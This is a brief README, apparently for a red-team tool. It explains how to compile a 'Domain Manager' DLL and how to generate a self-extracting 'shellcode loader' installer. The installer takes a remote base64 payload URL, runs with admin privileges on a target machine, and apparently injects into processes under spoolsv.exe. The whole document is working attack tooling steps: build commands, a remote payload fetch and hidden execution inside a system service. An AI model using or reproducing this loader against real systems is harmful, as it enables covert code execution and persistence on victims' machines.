## Compile Domain Manager DLL
Domain Manager DLL can be compiled again with the command below.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:library DomainManager.cs
```

## Generate Shellcode Loader SFX 
Download files.zip and extract to a directory
Use Powershell to generate SFX file installer.exe
```
PS> .\generate.ps1 [URL]
## .\generate.ps1 https://gist.github.com/millers-crossing/86b68f2d342ffce5812653323b47d17c/raw/a77a7219873bbbd204f880622ac8fe5d9f105efe/notepad.b64
```
To test the attack run the installer with admin privileges on the target machine

## Rewind 
```
kill child WerFault.exe and notepad.exe processes under spoolsv.exe 
```
